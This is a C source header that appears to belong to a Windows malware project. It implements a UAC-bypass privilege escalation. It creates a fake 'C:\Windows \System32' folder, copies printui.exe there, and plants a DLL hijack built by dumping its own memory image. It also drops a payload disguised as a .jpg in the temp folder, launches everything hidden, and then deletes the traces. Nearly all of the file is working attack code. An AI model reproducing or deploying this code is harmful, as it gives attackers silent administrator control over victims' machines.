#ifndef PRIV_INCL
#define PRIV_INCL
#include <stdio.h>
#include <windows.h>
#include <direct.h>
#include "../migrate.h"
//one of my more cursed works, chain: pe injected in process dumps self code from memory -> modify to act as a dll and dump to disk -> trigger exploit -> dll (now admin) spawns itself as an exe (this is because dlls are very fiddly and makes a lot of weird bug, also we need to do exploit cleanup) -> exe does exploit cleanup -> win admin
BOOL IsProcessElevated(){
	BOOL fIsElevated = FALSE;
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize;

	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize);
	fIsElevated = elevation.TokenIsElevated;

	if (hToken){
		CloseHandle(hToken);
		hToken = NULL;
	}
	return fIsElevated; 
}
static int MyCopy(const char* from, const char* to){
    DWORD bytesRead = 0;
    DWORD bytesWritten;
    HANDLE hFile = CreateFileA(from, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return -1;
    
    char* buffer = calloc(1000000, 1);
    if (!ReadFile(hFile, buffer, 1000000, &bytesRead, NULL)){
        CloseHandle(hFile);
        free(buffer);
        return -1;
    }
    CloseHandle(hFile);
    HANDLE hFile2 = CreateFileA(to, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL);

    if (hFile2 == INVALID_HANDLE_VALUE){
        free(buffer);
        return -1;
    }
    WriteFile(hFile2, buffer, bytesRead, &bytesWritten, NULL);

    CloseHandle(hFile2);
    free(buffer);
    return 0;
}
BOOL dllmain(HMODULE a, DWORD b, LPVOID c){
    if(b == DLL_PROCESS_ATTACH){
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW;
        ZeroMemory(&pi, sizeof(pi));
        char tmp[MAX_PATH] = {0};
        GetTempPathA(MAX_PATH, tmp);
        strcat(tmp, "cache_2992u8.jpg");
        CreateProcess(NULL, tmp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        
        return TRUE;
    }
}
int cleanup(){
    DeleteFileA("C:\\Windows \\System32\\printui2.exe");
    DeleteFileA("C:\\Windows \\System32\\printui.dll");
    RemoveDirectoryA("\\\\?\\C:\\Windows \\System32");
    RemoveDirectoryA("\\\\?\\C:\\Windows \\");
    main(0, 0);
}
static void dump2disk(const char* name, void* entryp, int dll){
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)revival;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)revival + dosHeader->e_lfanew);

	PVOID localImage = calloc(ntHeader->OptionalHeader.SizeOfImage, 1);	
	memcpy(localImage, revival, ntHeader->OptionalHeader.SizeOfHeaders);
	PIMAGE_NT_HEADERS ntHeader2 = (PIMAGE_NT_HEADERS)((DWORD_PTR)localImage + dosHeader->e_lfanew);
	
	if(dll)
	    ntHeader2->FileHeader.Characteristics |= 0x2000;
    if(entryp)
        ntHeader2->OptionalHeader.AddressOfEntryPoint = (unsigned long long)entryp - (unsigned long long)imageBase;
	int sumsz = ntHeader->OptionalHeader.SizeOfHeaders;
    for (int count = 0; count < ntHeader->FileHeader.NumberOfSections; count++){
        PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((DWORD64)localImage + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (count * 40));
        memcpy((LPVOID)((DWORD64)localImage + SectionHeader->PointerToRawData), (LPVOID)((DWORD64)revival + SectionHeader->VirtualAddress), SectionHeader->SizeOfRawData);
        sumsz += SectionHeader->SizeOfRawData;
    }
    
    HANDLE hFile = CreateFileA(name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, NULL);
    DWORD bytesWritten;
    WriteFile(hFile, localImage, sumsz, &bytesWritten, NULL);
    CloseHandle(hFile);
    free(localImage);
}

int privesc(){
    if(!IsProcessElevated()){
        char tmp[MAX_PATH] = {0};
        GetTempPathA(MAX_PATH, tmp);
        strcat(tmp, "cache_2992u8.jpg");
        dump2disk(tmp, &cleanup, 0);
        CreateDirectoryA("\\\\?\\C:\\Windows \\", NULL);
        CreateDirectoryA("\\\\?\\C:\\Windows \\System32", NULL);
        MyCopy("\\\\?\\C:\\Windows\\System32\\printui.exe", "C:\\Windows \\System32\\printui2.exe");

        dump2disk("C:\\Windows \\System32\\printui.dll", &dllmain, 1);
        
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW;
        ZeroMemory(&pi, sizeof(pi));
        
        CreateProcess(NULL, "cmd.exe /c \"C:\\Windows \\System32\\printui2.exe\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if(isChild)
        	ExitThread(0);
	    else
            ExitProcess(0);
    }
}

#endif
